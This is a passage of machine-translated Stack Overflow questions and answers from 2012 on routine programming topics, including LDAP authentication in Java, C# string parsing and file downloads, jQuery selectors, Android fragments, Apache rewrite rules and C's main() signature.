> 时间：2012-08-27T17:28:40.923

您的函数只调用一个值，一旦被调用，相关元素就不会改变它们的函数调用。

为了澄清，我相信您应该使用切换文本而不是更改文本的方法。[请参阅本教程](http://www.randomsnippets.com/2008/02/12/how-to-hide-and-show-your-div/)的切换部分，让您的链接根据需要更改文本。

# java - 如何使用用户名和密码从 LDAP 目录验证用户？

> ID：12146567
> 
> 赞同：0
> 
> 时间：2012-08-27T17:24:59.107
> 
> 标签：java, ldap, spring-ldap

我是 LDAP API 的新手。我能够连接到 LDAP 服务器并搜索用户。如何使用 LDAP API 对用户名/密码进行身份验证？我没有看到任何身份验证方法`DirContext`。
验证用户是否必须：

1.  将用户密码作为 SECURITY_CREDENTIALS 传递
2.  建立 LDAP 连接
3.  搜索给定的用户名

这是否意味着 LDAP 中的身份验证？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T18:53:53.733

当客户端连接到 LDAP 目录服务器时，连接授权状态设置为`anonymous`。LDAP 客户端使用 BIND 请求来更改连接的授权状态。每个 BIND 请求将连接授权状态更改为`anonymous`，每个成功的 BIND 请求将连接的授权状态更改为与成功的 BIND 请求关联的授权状态，即用户的授权状态。失败的 BIND 请求使连接处于某种`anonymous`状态。

客户端构造一个`BindRequest`（简单的 BIND 请求或一种形式的 SASL 绑定请求）传输到 LDAP 目录服务器并解释来自服务器的响应，包括可能伴随 BIND 响应的任何响应控制。BIND 响应中的结果代码为零表示 LDAP 目录服务器与凭据匹配并且用户已通过身份验证。

如果用户的专有名称已知，则可以从专有名称构造 BIND 请求。如果不知道，LDAP 客户端必须构造一个搜索请求，将其传输到服务器并解释响应。可分辨名称始终包含在返回至少一个条目的成功搜索响应中。然后使用搜索响应中返回的distinct来构造如上的BIND请求。

在最简单的情况下：

```
// exception handling is not shown
final String dn = ....;
final byte[] password = ....;
final BindRequest bindRequest = new SimpleBindRequest(dn,password);
final LDAPConnection ldapConnection = new LDAPConnection(hostname,port);
final BindResult bindResult = ldapConnection.bind(bindRequest);
final ResultCode resultCode = bindResult.getResultCode();
if(resultCode.equals(ResultCode.SUCCESS))
{
    // user is authenticated
}
ldapConnection.close(); 
```

如果您使用 Java，则应使用[UnboundID LDAP SDK](https://www.unboundid.com/products/ldap-sdk/)（JNDI 不应用于新代码）。

### 也可以看看

*   [LDAP：使用 Java 绑定](https://ff1959.wordpress.com/2011/09/27/using-java-to-bind-to-a-directory-server/)
*   [LDAP：编程实践](http://www.ldapguru.info/ldap/ldap-programming-practices.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:27:25.277

你可以试试 JAAS。为此，JDK 中有[com.sun.security.auth.module.LdapLoginModule 。](http://docs.oracle.com/javase/6/docs/jre/api/security/jaas/spec/com/sun/security/auth/module/LdapLoginModule.html)我试过了，效果很好。

# java - 最适合 JTextComponent

> ID：12146570
> 
> 赞同：-1
> 
> 时间：2012-08-27T17:25:05.970
> 
> 标签：java, swing, text, jtextcomponent

我一直在处理各种文本组件，现在我来这里寻求答案。

我需要的是一个用户可以使用键盘和/或复制/粘贴输入文本的区域。这些是组件的要求：

自动换行，限制行数的能力（自动换行），防止用户输入某些字符（或按回车换行）的能力，根据内容扩展和减小高度的能力（使内容适合组件并且没有（几个像素很好）剩余高度，能够直接或通过跟踪行号来检测其高度的变化。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:30:31.640

Have a look at the different Text Components provided by the Java API here: [Using Text Components](http://docs.oracle.com/javase/tutorial/uiswing/components/text.html)

in the above it has 3 different types of text components:

*   Text Controls
*   Plain Text Areas
*   Styled Text Areas

And it looks like the definition of the last `Styled Text Areas` fits your needs:

> A styled text component can display editable text using more than one font. Some styled text components allow embedded images and even embedded components. Styled text components are powerful and multi-faceted components suitable for high-end needs, and offer more avenues for customization than the other text components. Because they are so powerful and flexible, styled text components typically require more initial programming to set up and use. One exception is that editor panes can be easily loaded with formatted text from a URL, which makes them useful for displaying uneditable help information.

These would include the likes of:

*   [JEditorPane](http://docs.oracle.com/javase/7/docs/api/javax/swing/JEditorPane.html)
*   [JTextPane](http://docs.oracle.com/javase/7/docs/api/javax/swing/JTextPane.html) (sub-class of `JEditorPane`)

# c# - 获取列出 csproj 文件的引用的路径

> ID：12146572
> 
> 赞同：1
> 
> 时间：2012-08-27T17:25:10.587
> 
> 标签：c#, .net, xml, linq, msbuild

我知道一个 csproj 文件的路径（在 100 个其他项目文件中）。我想检查“bin”中存在哪些引用，以便将这些引用的“复制本地”值设置为 false。为此，我需要获取引用的路径（或者有更好的方法吗？？）。如何获取 csproj 文件中列出的引用的路径？

提前致谢！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T06:10:20.360

尝试以下操作：

```
var project = ProjectRootElement.Open(fileName);
var referenceElements = project.Items
    .Where(x => x.ItemType.Equals("Reference"))
    .Where(x => x.HasMetadata && x.Metadata.Any(m => m.Name.Equals("HintPath") && CheckLocation(m.Value)));

    foreach (var projectItemElement in referenceElements) 
    {
        var copyLocalElement = projectItemElement.Metadata.FirstOrDefault(x => x.Name.Equals("CopyLocal"));
        if (copyLocalElement != null) 
        {
            copyLocalElement.Value = "false";
            continue;
        }
        projectItemElement.AddMetadata("CopyLocal", "false");
    } 
```

根据需要实施 CheckLocation 方法。我没有完全测试这一点，但我希望它显示正确。

# c# - 在 C# 中将字符串转换为 double 或任何数值类型变量

> ID：12146574
> 
> 赞同：2
> 
> 时间：2012-08-27T17:25:13.937
> 
> 标签：c#, string, double

我有一个读取 xml 文件的程序。我已经有一个读取特定元素并将其放在变量中的代码。唯一缺少的是将元素（数字）与双变量进行比较，但元素被视为字符串。我在 Google 中看到的只是将双精度转换为字符串。如何将字符串转换为双精度？

编辑：

我现在明白了，我还不能回答我自己的问题，因为我的声誉仍然很低。这就是我到目前为止所做的并且它有效：

```
string stringNum = "2";
double value = double.Parse(stringNum); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:27:01.653

```
var number = double.Parse("2.5", CultureInfo.InvariantCulture); 
```

[请参阅 MSDN 上的 Double.Parse](http://msdn.microsoft.com/en-us/library/system.double.parse.aspx)

提醒一下，您可能想看一下`Parse(String, IFormatProvider)`，因为解析 XML 意味着您必须查看“数字字符串”的格式。通常的做法是`CultureInfo`在使用时指定`ToString`或`Parse`方法。[在这里查看更多信息](http://msdn.microsoft.com/en-us/library/ms182189%28v=vs.80%29.aspx)。

> 如果未提供 CultureInfo 或 System.IFormatProvider 对象，则重载成员提供的默认值可能不会在所有语言环境中产生您想要的效果。此外，.NET Framework 成员会根据您的代码可能不正确的假设来选择默认区域性和格式设置。为确保代码在您的场景中按预期工作，您应该提供特定于文化的信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:26:30.150

您可以使用`Double.Parse`，第二个参数指定文件中数字的文化。

```
var newDouble = Double.Parse(theString, new CultureInfo("en-GB")); 
```

# java - 如果 URL 参数值包含未编码的 '&' 字符

> ID：12146575
> 
> 赞同：0
> 
> 时间：2012-08-27T17:25:16.773
> 
> 标签：java, web-applications

我正在开发一个 Java Web 应用程序。此应用程序从第 3 方的应用程序接收 URL 参数。因此，URL 参数的值可能不会被编码。当参数值包含未编码的 '&'（编码值 %26）时，如何解析 URL 参数值？

例如：“page.jsp?title=Street **&** Smith&address=1223”

在这里，第 3 方传递了未编码的参数值：'Street **&** Smith'

谢谢MFH

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:28:25.287

你不能，那是一个损坏的 URL（这就是编码首先存在的原因）。

你可以写一些启发式来“猜测”作为最初的意图，但这将是一个猜测（有时会是错误的）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:49:37.273

这是另一个来自用户的 Stackoverflow 帖子，他希望完成与您尝试做的类似的参数值编码：[如何编码 URI 参数值？](https://stackoverflow.com/questions/444112/how-do-i-encode-uri-parameter-values)

# javascript - wysihtml5 命令显示为未定义

> ID：12146576
> 
> 赞同：0
> 
> 时间：2012-08-27T17:25:21.467
> 
> 标签：javascript, wysihtml5, bootstrap-wysihtml5

当我加载`wysithml5`引导编辑器时，此命令或`wysihtml5`引导支持的任何命令都不起作用。

当我 alert`editor.composer.commands`时，它显示为未定义。

我能做些什么来解决这个问题？jQuery 加载了 jQuery-UI，我不知道这是否有帮助。

```
$(document).ready(function() {
    $('#content').wysihtml5();
    var editor = $('#content').wysihtml5().data("wysihtml5").editor;
    editor.currentView.element.focus();
    editor.composer.commands.exec('insertHTML' , 'Something');`
}); 
```

参考编辑器：[https ://github.com/xing/wysihtml5](https://github.com/xing/wysihtml5)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-28T12:55:52.693

在编辑器实例化并加载到页面后不久以编程方式使用命令时，我遇到了这个问题。考虑以下代码：

```
<textarea id="wysihtml5-textarea" rows="3" autofocus></textarea> 
```

我通过在使用 window.setTimeout 加载编辑器后允许一段时间来解决它。下面的代码是使用“insertImage”命令的示例：

```
$(function () {
   var editorEle = $('#wysihtml5-textarea');
   var editorToolbarEle = $('#wysihtml5-toolbar');
   var editor = new wysihtml5.Editor(editorEle.prop('id'), {});

   window.setTimeout(function() {
      editor.focus();
      editor.composer.commands.exec("insertImage", { src: 'foo.png', alt: "image.." });
   }, 200);
}); 
```

您可以看到此代码正在运行并使用以下 JSFiddle 对其进行测试（删除 setTimeout 以查看错误发生）：

[http://jsfiddle.net/wv0fbsew/](http://jsfiddle.net/wv0fbsew/)

我在使用分叉版本的编辑器（wysihtml5x）时遇到了这个问题。它不是这个问题中提到的 Bootstrap 版本，也不是我使用的那个，但问题是一样的。

# javascript - jQuery：如何在没有 for 循环的情况下将事件处理程序应用于 $('#text' + 'any integer')？

> ID：12146577
> 
> 赞同：0
> 
> 时间：2012-08-27T17:25:20.617
> 
> 标签：javascript, jquery, html, events, integer

我正在寻找这样的东西：

```
$('#showcomments' + 'any integer' ).click(function(){ do stuff }); 
```

我不想使用`for`循环，因为唯一 id `showcomments1`、`showcomments2`等的数量取决于内容因用户输入而改变的数据库。

而且我不想在 jQuery 中访问数据库只是为了创建一个`for`始终受限于表中行数的循环。

当然有某种方式来表达“任何整数”？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-27T17:27:00.673

如果您不想循环，请使用[带有选择器的开头](http://api.jquery.com/attribute-starts-with-selector/)

```
$('[id^=showcomments]').click(function(){ do stuff }); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-27T17:27:46.280

我会在这种情况下使用类选择器......

```
$('.comments').click(function(){ do stuff }); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-27T17:43:35.960

> 我仍然想知道是否有办法表达“任何整数”

据我所知，但您始终可以过滤选择器以排除字母：

```
$('[id^=showcomments]').filter(function() {
    var numb = this.id.replace('showcomments', ''); //remove text, get integer
    return ((parseFloat(numb) == parseInt(numb)) && !isNaN(numb));//integer check
}).click(function(){ do stuff }); 
```

[**小提琴**](http://jsfiddle.net/cUVVP/2/)

# c# - saveFileDialog 停止工作 + 从 Internet 下载文件

> ID：12146581
> 
> 赞同：1
> 
> 时间：2012-08-27T17:25:32.647
> 
> 标签：c#, file, download, savefiledialog

我想创建一个更新功能。当出现新版本时，将出现一个输入框，其中包含一个下载按钮。当我按下该按钮时，saveFileDialog 将出现以将文件（新版本）保存在我想要的位置。

我有这个功能：

```
public void descarcare()
    {

        SaveFileDialog saveFileDialog1 = new SaveFileDialog();

        saveFileDialog1.CreatePrompt = true;
        saveFileDialog1.OverwritePrompt = true;
        saveFileDialog1.FileName = "myText";
        saveFileDialog1.DefaultExt = "txt";
        saveFileDialog1.Filter ="Text files (*.txt)|*.txt|All files (*.*)|*.*";
        saveFileDialog1.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        DialogResult result = saveFileDialog1.ShowDialog();

        if (result == DialogResult.OK)
        {

            try
            {
                WebClient webClient = new WebClient();
                byte[] receivedData = webClient.DownloadData("http://startut.ro/smartAppointment.rar");
                FileStream fs = new FileStream(saveFileDialog1.FileName, FileMode.Create);
                BinaryWriter bw = new BinaryWriter(fs);

                bw.Write(receivedData);

                bw.Close();
                fs.Close();
                ((IDisposable)fs).Dispose();
            }
            catch (Exception e)
            {
                string message = e.Message;
                MessageBox.Show("Nu ai o conexiune de internet stabilită. Încearcă să te conectezi la internet, și după aceea să descarci noua versiune !", "EROARE CONEXIUNE INTERNET");
            }

        }
    } 
```

首先我尝试使用一个测试按钮来查看该功能是否有效，然后我将在输入框中实现。

```
 private void button14_Click(object sender, EventArgs e)
        {
             descarcare();
        } 
```

当我按下按钮时，会出现 saveFileDiaglog 并且在崩溃之后。任何 saveFileDialog 都会出现崩溃。如果我只有一个没有任何代码的 saveFileDialog，会崩溃，问题是 saveFileDialog。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T18:46:16.180

删除第一行“saveFileDialog1.ShowDialog();” 没用！！

消除

```
SaveFileDialog saveFileDialog1 = new SaveFileDialog(); 
```

从你的函数 descarcare();

你应该像这样创建它。

```
public partial class Form1: Form
{
....
    internal SaveFileDialog SaveFileDialog1;
....

    public Form1() : base()
    {   
                ....
                this.SaveFileDialog1 = new SaveFileDialog();
                .... 
```

为了获得更好的代码，您应该将 SaveFileDialog1 设置为类似这样。

```
....
SaveFileDialog1.CreatePrompt = true;
SaveFileDialog1.OverwritePrompt = true;
SaveFileDialog1.FileName = "myText";
SaveFileDialog1.DefaultExt = "txt";
SaveFileDialog1.Filter = 
            "Text files (*.txt)|*.txt|All files (*.*)|*.*";
SaveFileDialog1.InitialDirectory = 
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
DialogResult result = SaveFileDialog1.ShowDialog();
if (result == DialogResult.OK)
            {

                try
.... 
```

在 catch 块中，您还应该将“消息”放到输出中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:53:30.410

像这样修改你的代码：

```
 saveFileDialog1.ShowDialog();

   if (saveFileDialog1.ShowDialog() == DialogResult.OK)
   {

       try
       {
           WebClient webClient = new WebClient();
           byte[] receivedData = webClient.DownloadData("http://startut.ro/smartAppointment.rar");
           FileStream fs = new FileStream(saveFileDialog1.FileName, FileMode.Create);
           BinaryWriter bw = new BinaryWriter(fs);

           bw.Write(receivedData);

           bw.Close();
           fs.Close();

       }
       catch (Exception e)
       {
           string message = e.Message;
           MessageBox.Show("Nu ai o conexiune de internet stabilită. Încearcă să te conectezi la internet, și după aceea să descarci noua versiune !", "EROARE CONEXIUNE INTERNET");
       }

   } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:48:00.640

这是你的问题

```
**DialogResult result = saveFileDialog1.ShowDialog();** 
```

你需要改变你正在做的代码 DialogResult result = saveFileDialog1.ShowDialog(); 至

```
SaveFileDialog saveFileDialog1 = new SaveFileDialog();  
// you need to Create an Instance of SaveFileDialog

var result = saveFileDialog1.ShowDialog();
if (result == DialogResult.OK)
{
  //do your logic here.. 
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-27T17:35:25.913

使用 silverlight，由于安全限制，它们不会为您提供正在保存的文件的位置。[但是，您可以使用OpenFile](http://msdn.microsoft.com/en-us/library/system.windows.controls.savefiledialog.openfile%28v=vs.95%29.aspx)函数为用户选择的文件获取一个 Stream 对象。

查看[这篇文章](http://www.michielpost.nl/PostDetail_25.aspx)，了解如何将 WebClient 与 Stream 对象一起使用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-27T17:51:45.943

建议将代码重组为：-

```
WebClient webClient = new WebClient();    
saveFileDialog1.ShowDialog();
webClient.DownloadFileCompleted += new AsyncCompletedEventHandler (FileDownloaded);//Implement this method to notify the download.

   if (saveFileDialog1.ShowDialog() == DialogResult.OK)
   {

       try
       {               
           webClient.DownloadFileAsync("http://startut.ro/smartAppointment.rar", saveFileDialog1.FileName);
       }
       catch (Exception e)
       {
           string message = e.Message;
           MessageBox.Show("Nu ai o conecsiune de internet stabilită. Încearcă să te conectezi la internet, și după aceea să descarci noua versiune !", "EROARE CONECSIUNE INTERNET");
       }

   } 
```

进一步的 saveFileDialog1.FileName 给出了必须保存文件的完整路径，因此它不应该成为问题。

但是我会建议使用 `webClient.DownloadFileAsync`而不是`webClient.DownloadFile`因为稍后是阻塞调用。

# mysql - 投票插件在哪里更新 Joomla 数据库中的数据？

> ID：12146583
> 
> 赞同：0
> 
> 时间：2012-08-27T17:25:47.587
> 
> 标签：mysql, joomla, vote

基本的 Joomla 投票插件： `/plugins/content/vote/vote.php`

有人知道文章的投票在哪里以及如何更新吗？我找到了一个名为`#__content_rating`.

所以，我不明白，当有人为文章投票时，这个脚本如何`..vote/vote.php` 更新表中的数据`#__content_rating`？

有人知道吗？我试图找到它，但没有成功。

ps 我正在使用 Joomla！2.5.0 稳定。先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:40:05.583

插件文件不包含存储功能。为此，您必须前往：

`components/com_content/models/article.php`

该函数从第 266 行开始 ( `public function storeVote($pk = 0, $rate = 0) {`)

但是，除非您确切知道自己在做什么，否则我不建议您更改核心 Joomla 文件。我建议您在进行任何更改之前也更新到最新的 Joomla 版本（2.5.6），以防您决定将来更新并且更新会覆盖该特定文件。

希望这可以帮助

# content-management-system - Silverstripe 3 左连接

> ID：12146586
> 
> 赞同：1
> 
> 时间：2012-08-27T17:25:55.827
> 
> 标签：content-management-system, silverstripe

我在自定义页面类型“ProjectPage”和相应的关系表（“ProjectPage_Categories”）上进行左连接时遇到问题。ProjectPage 有许多类别，并且类别上可以属于许多项目。ProjectPage 看起来像这样：

```
class ProjectPage extends Page { 
    static $many_many = array(
        'Categories' => 'Category'
    ); 
```

和这样的类别：

```
class Category extends DataObject {
    static $belongs_many_many = array(
        'ProjectPages' => 'ProjectPage'
    ); 
```

我正在尝试获取与某个类别相关的所有 ProjectPages，如下所示：

```
$projectPages = ProjectPage::get()
        ->leftJoin("ProjectPage_Categories", "ProjectPage_Categories.ProjectPageID = ProjectPage.ID")
        ->filter(array('CategoryID' => $categoryID)); 
```

不幸的是，这不起作用。总是有一个sql错误：*'on子句'中的未知列'ProjectPage.ID'*

一个非常相似的事情没有问题：

```
$members = Member::get()
    ->leftJoin("Group_Members", "Group_Members.MemberID = Member.ID")
    ->filter(array('GroupID' => '2')); 
```

我猜有一个问题，因为 ProjectPage 扩展了 Sitetree，并且没有名为“ProjectPage”的表。我试图用 SiteTree 替换 ProjectPage，但到目前为止没有成功。

非常感谢，弗洛里安

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T18:16:03.707

如果我做对了，您根本不需要手动加入：

```
$category = Category::get()->byID($categoryID);
$projectPages = $category->ProjectPages(); 
```

不？

# java - 从内部 DialogFragment 内的主 Fragment 调用方法时出错

> ID：12146587
> 
> 赞同：0
> 
> 时间：2012-08-27T17:26:02.783
> 
> 标签：java, android, android-fragments

我想从用于返回 DialogFragment 的 Dialog 的 AlertDialog 的方法 setPositiveButton() 内部的 Fragment 调用一个方法，但不能这样做。

我在一个名为 Test 的类中有方法 doSomething() ，它扩展了 Fragment。在这个类内部，我有一个扩展 DialogFragment 的内部类。在方法 onCreateDialog 是问题发生的地方。看代码：

```
public class Test extends Fragment {

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    View view = inflater.inflate(R.layout.activity_main, null);
    return view;
}

public static class SelectDeviceDialogFragment extends DialogFragment {

    @Override
    public Dialog onCreateDialog(Bundle savedInstanceState) {
        return new AlertDialog.Builder(getActivity())
        .setPositiveButton(R.string.ok,
                new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                ((Test) getTargetFragment()).doSomething();
            }
        }).create();
    }
}

private void doSomething() {}
} 
```

DialogFragment 和 Fragment 来自 lib android.support.v4。

发生错误是因为无法完成对 Test 的强制转换。在那种情况下，我怎么能调用方法 doSomething 呢？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T19:31:17.460

在修改我的答案时，您可以走两条路。首先是将静态类更改为最终声明，如下所示：

```
public final DialogFragment selectDeviceDialogFragment = new DialogFragment(){
    @Override
    public Dialog onCreateDialog(Bundle savedInstanceState) {
        return new AlertDialog.Builder(getActivity())
                .setPositiveButton(R.string.ok,
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                doSomething();
                            }
                        }).create();
    }    
}; 
```

如果这不合适并且您确实需要静态声明，则应使用接口与其通信。因为您使用的是静态类，所以假设您正在从另一个 Fragment 调用此 DialogFragment。如果是这样的话，我会走这条路：

```
public interface DoSomething{
     public void doSomething();
} 
```

现在在您的活动中，您需要实现 DoSomething 接口：

```
private class MyActivity extends Activity implements DoSomething{

    /** other methods **/

    @Override
    public void doSomething() {
        FragmentManager fragmentManager = getFragmentManager();
        Test frag = (Test)fragmentManager.findFragmentById(/*the fragment id*/);
        frag.doSomething();
    }
} 
```

现在回到内部对话框类中的测试片段：

```
public static class SelectDeviceDialogFragment extends DialogFragment {

    @Override
    public Dialog onCreateDialog(Bundle savedInstanceState) {
        return new AlertDialog.Builder(getActivity())
                .setPositiveButton(R.string.ok,
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                MyActivity activity = (MyActivity)getActivity();
                                activity.doSomething();
                            }
                        }).create();
    }
} 
```

希望这次我已经回答了你的问题:)

# ant - Ant 'which' 命令

> ID：12146591
> 
> 赞同：0
> 
> 时间：2012-08-27T17:26:26.203
> 
> 标签：ant

我正在尝试使用 ant（类似于“which”命令）查找可执行文件的路径（在 Linux 上）。例如：

```
which ls 
```

输出：

```
/bin/ls 
```

它不能搜索文件系统，它必须搜索 $PATH。

到目前为止，我所看到的只是使用 jython 编写脚本可以工作，但我想知道替代方案，因为 jython 似乎需要安装（我宁愿避免安装）。有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T22:12:42.247

您可以在构建脚本中嵌入脚本语言。

以下示例使用 ivy 下载所需的依赖项，并且应该也可以在 Windows 上运行：

```
<project name="ANT which" default="which" xmlns:ivy="antlib:org.apache.ivy.ant">

    <description>
    ANT example that simulates the unix "which" command

        $ ant -Dwhich.cmd=ls

        which:
        Found /bin/ls
    </description>

    <!--
    Properties
    -->
    <property environment="env"/>
    <property name="which.cmd" value="ls"/>

    <!--
    Bootstrap the build for ANT installations without ivy pre-installed
    -->
    <target name="bootstrap" description="Install ivy">
        <mkdir dir="${user.home}/.ant/lib"/>
        <get src="http://search.maven.org/remotecontent?filepath=org/apache/ivy/ivy/2.3.0-rc1/ivy-2.3.0-rc1.jar" dest="${user.home}/.ant/lib/ivy.jar"/>
    </target>

    <!--
    Download groovy
    -->
    <target name="resolve" description="Resolve build dependencies">
        <ivy:cachepath pathid="build.path">
            <dependency org="org.codehaus.groovy" name="groovy-all" rev="2.0.1" conf="master"/>
        </ivy:cachepath>

        <taskdef name="groovy" classname="org.codehaus.groovy.ant.Groovy" classpathref="build.path"/>
    </target>

    <!--
    Parse the PATH variable and determine if the command is available
    -->
    <target name="which" depends="resolve" description="ANT which command">
        <groovy>
            <arg value="${which.cmd}"/>

            def sepchar = properties["path.separator.ivy.instance"]

            properties["env.PATH"].split(sepchar).each {
                def dir = new File(it)

                if (dir.exists()) {
                    dir.eachFileMatch(~/^${args[0]}(.bat|.cmd)?$/) {
                        project.log "Found ${it}"
                    }
                }
            }
        </groovy>
    </target>

    <!--
    Cleanup
    -->
    <target name="clean" description="Purge the ivy cache">
        <ivy:cleancache/>
    </target>

</project> 
```

# c - C中main()的定义

> ID：12146594
> 
> 赞同：12
> 
> 时间：2012-08-27T17:26:27.983
> 
> 标签：c

> **可能重复：**
> [在 C 中定义无参数函数 main() 的标准方法](https://stackoverflow.com/questions/8022274/standard-way-to-define-parameter-less-function-main-in-c)

我可以在 C 中使用函数的~~声明~~定义，如下所示：`main()`

```
int main() {} 
```

是的，我看到该标准说只有两个保证支持的版本：

```
int main(void) {} 
```

和

```
int main(int argc, char* argv[]) {} 
```

但是空虚又如何呢？我知道它与 C++ 中的含义不同（在 C 中，这意味着该函数的参数的数量和类型是未知的），但是我在 C 中看到了很多带有main~~声明~~定义的代码。

那么谁错了？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-27T17:31:30.947

In C, there's a difference between the *declarations* `int main();` and `int main(void);` (the former declares a function with an *unspecified* number of arguments, and the latter is actually called a *proto­type*). However, in the function *definition*, both `main()` and `main(void)` define a function that takes *no* arguments.

The other signature, `main(int, char**)`, is an *alternative* form. Conforming implementations must accept either form, but may also accept other implementation-defined signatures for `main()`. Any given program may of course only contain *one* single function called `main`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-27T17:37:00.057

`int main()`和任何其他这样的函数声明，它需要未知数量的参数，所以这对于主函数是绝对错误的。`int main(void)`它不需要任何参数。

`char* argv[]`是**自**变量 **向量**。当你在命令行上写你的参数时，你会在这个字符串向量中找到参数。有时你也可以找到`char **argv`，但它是一样的。括号`[]`是空的，因为我们不知道有多少参数来自用户；为此目的存在`int argc` **参数**计数：它计算有多少参数**（**`argv`尽管列表也以标记值终止`argv[argc] == NULL`）。

另请阅读此[链接](https://stackoverflow.com/questions/51032/is-there-a-difference-between-foovoid-and-foo-in-c-or-c)以了解通用`foo()`和`foo(void)`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-27T17:44:19.500

如果实现明确记录`int main()`（没有参数）作为有效签名，那么从 C99 开始，一切都很好（§5.1.2.2.1 ¶1，“......或以其他一些实现定义的方式。”）。

如果实现*没有*`int main(void)`记录它，那么严格来说行为是未定义的（§4 ¶2），但根据我的经验， 它导致行为显着不同的几率非常低。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-27T17:50:42.893

```
 int main() {}
   this is the standard prior to the c99 standard of main method.

   int main(void){}
   this is the standard coined by ANSI.

   int main(int argc, char* argv[]) {}     
   This is the another version of main which provides the user to pass the command line
   argument to the main method. 
```

# php - 我怎样才能使这个 RewriteRule 工作？

> ID：12146595
> 
> 赞同：1
> 
> 时间：2012-08-27T17:26:27.780
> 
> 标签：php, apache, mod-rewrite, rewrite

```
RewriteRule ^articles\.php\?id=([0-9]+)$ article-a$1.html [R=301,L] 
```

我想让所有链接如articles.php?id=1211 指向article-a{ID}.html，我该如何实现？这条规则有什么问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:28:14.940

您无法匹配重写规则中的查询字符串，您需要匹配`%{QUERY_STRING}`条件中的 var 并使用`%`反向引用：

```
RewriteCond %{QUERY_STRING} ^id=([0-9]+)$ 
RewriteRule ^articles\.php$ article-a%1.html [R=301,L] 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-27T17:30:24.450

Usefollowing,

```
RewriteRule ^articles.php?id=([0-9]+)$ article-a$1.html 
```

# python - JSONEncoder 子类返回实际的 JSON 表示，而不是可序列化的对象

> ID：12146599
> 
> 赞同：0
> 
> 时间：2012-08-27T17:26:35.330
> 
> 标签：python, json

我正在尝试`ISOWeek`使用 python 2.7 的内置`json`模块对自定义 python 类的实例进行编码。我希望它不是编码为 JS 字符串（例如`"2012-08"`），而是编码为构造函数调用：`new ISOWeek({year: 2012, kw: 8})`. Python 的`json`文档说我应该继承`JSONEncoder`并覆盖该`default`方法，但是我只能从中返回另一个 JSON 可序列化对象，而不是实际的序列化。查看`json.py`源代码，我看不到破解模块的明显方法。有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:37:44.100

我建议不要将构造函数调用直接放入 JSON 中（这使得 JSON 无效），我建议您格式化数据以便您知道发生了什么，并且只需修改 JS 以进行正确的转换，例如，而不是以下：

```
{"date": new ISOWeek({year: 2012, kw: 8})} 
```

我会建议这样的事情：

```
{"date": ["ISOWeek", {"year": 2012, "kw": 8}]} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:36:59.157

我认为这不是有效的 JSON。请参阅[http://www.json.org/](http://www.json.org/)。您可以在 JavaScript 中执行此操作，但在 JSON 中，您仅限于基本类型（字符串、数字、布尔值、null 和这些类型的列表/字典）。

您可以将其序列化为构造函数的字符串版本，或包含相关信息的其他对象。但是，您需要以一种或另一种方式在*接收*端进行处理，以将其解码为您的 ISOWeek 对象。

# algorithm - 给定两棵树，如何找到其中一棵树是另一棵树的子树？

> ID：12146621
> 
> 赞同：0
> 
> 时间：2012-08-27T17:27:55.157
> 
> 标签：algorithm, data-structures, tree

给定两棵树，如何找到其中一棵树是另一棵树的子树？给出最好的算法……并给出你回答的顺序……

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:47:20.937

想到的第一件事是遍历一棵树，看看它的孩子是否是另一棵树的头。然后反转。

如果您知道每棵树的高度，您可能可以找出哪棵树可能是另一棵树的子树。

如果您知道树的其他细节或特征（排序与否，平衡与否），您可以使用这些特征提出更快的算法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T18:13:05.813

下面是我们可以做的：假设我们有一个名为`isSubSet`获取两棵树的根的函数。另一方面，我们有一个称为`isIdentical`检查两棵树是否相同的函数。

假设我们要查看树 S 是否是树 T 的子集。如果 T 和 S 相同，则它们是相同的，否则我们通过`isSubset`再次调用函数来遍历 S。但是这次我们发送 T->Left 和 S 代表 T 的左子树和 T->Right 和 S 代表 S 的右子树。

[您可以在此处](http://www.geeksforgeeks.org/archives/13942)找到代码和更多信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T19:26:32.910

